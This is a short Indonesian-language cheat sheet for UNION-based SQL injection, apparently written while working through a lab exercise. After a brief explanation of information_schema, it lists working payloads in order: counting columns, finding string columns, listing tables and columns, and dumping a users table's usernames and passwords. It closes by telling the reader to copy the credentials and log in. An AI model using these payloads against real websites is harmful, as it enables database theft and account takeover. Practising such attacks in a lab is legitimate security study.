Mencantumkan isi basis data
Sebagian besar jenis basis data (kecuali Oracle) memiliki serangkaian tampilan yang disebut skema informasi. Ini menyediakan informasi tentang basis data.

Sebagai contoh, Anda dapat melakukan kueri information_schema.tablesuntuk menampilkan daftar tabel dalam basis data:

SELECT * FROM information_schema.tables

' ORDER BY 2-- # CEK DULU ADA BERAPA KOLOM
' UNION SELECT 'A', NULL-- # CEK KOLOM MANA YG BERTIPE STRINGS
' UNION SELECT table_name, NULL FROM information_schema.tables-- #Fungsi total dari perintah ini adalah memaksa database 
untuk membocorkan seluruh daftar nama tabel (nama lemari penyimpanan data) yang ada di dalam website tersebut, 
lalu menampilkannya langsung di layar browser kamu. dan cari table yg bernama unik contoh (users_kfsuqw) 

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_kfsuqw'-- #untuk melihat kolom apa saya yg ada di table users_kfsuqw
DAN CARI username DAN password CONTOHNYA (username_mxzcvr, password_rerkmr)
' UNION SELECT username_mxzcvr, password_rerkmr FROM users_kfsuqw-- # MELIHAT ISI USERNAME DAN PASSWORD YG ADA DI TABLE users_kfsuqw
SETELAH ITU SALIN ISI USERNAME DAN PASSWORDNYA DAN LOGIN


